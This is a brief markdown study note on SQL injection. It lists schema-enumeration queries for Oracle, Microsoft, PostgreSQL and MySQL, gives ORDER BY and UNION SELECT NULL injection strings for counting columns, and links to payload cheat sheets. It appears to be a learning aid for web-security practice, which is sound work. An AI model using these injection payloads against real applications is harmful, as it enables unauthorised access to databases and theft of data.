# SQLi Steps
1. Find out which DBMS the application uses
>- Oracle       

    SELECT * FROM all_tables  
    SELECT * FROM all_tab_columns  WHERE table_name = 'TABLE-NAME-HERE'  
>- Microsoft  	

    SELECT * FROM information_schema.tables  
    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'  
>- PostgreSQL	

    SELECT * FROM information_schema.tables  
    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
>- MySQL	

    SELECT * FROM information_schema.tables  
    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   
2. Find out the number of columns you can select by SQLi   
   
Select c1,c2 from table1 where cx=***'entrypoint'***   
>-  Way 1 -> by replace the entrypoint to '+order+by+testing_number--

>-  Way 2 -> replace entrypoint to '+union+select+null,null...+from+table_name--

3.  Using infromation_schema.tables & information_schema.columns to find the table you want and the columns you want:  
***cheetsheet weblink=>https://portswigger.net/web-security/sql-injection/cheat-sheet*** 

    
## In Conclusion
First -> Find the version of SQL using   

Second ->  Find out the number of columns you can select by SQLi   

Third -> Using infromation_schema.tables & information_schema.columns to find the table you want and the columns you want   

Additionally, a cheatsheet usefull => https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
